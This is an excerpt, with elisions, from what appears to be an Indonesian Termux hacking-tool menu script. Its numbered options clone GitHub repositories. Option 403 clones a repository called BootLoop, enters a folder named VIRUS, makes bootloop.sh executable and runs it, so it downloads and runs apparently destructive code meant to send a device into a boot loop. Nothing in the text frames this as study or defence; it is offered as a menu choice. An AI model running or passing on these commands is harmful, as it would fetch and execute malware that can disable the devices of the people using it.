...
sleep 1
echo  $green"Hargai Karya Orang Lain Cok :v" |lolcat
...
402) git clone https://github.com/mrcakil/Mrcakil.git
...
403) git clone https://github.com/Lamer1337Crew/BootLoop
cd VIRUS
chmod +x bootloop.sh
sh bootloop.sh
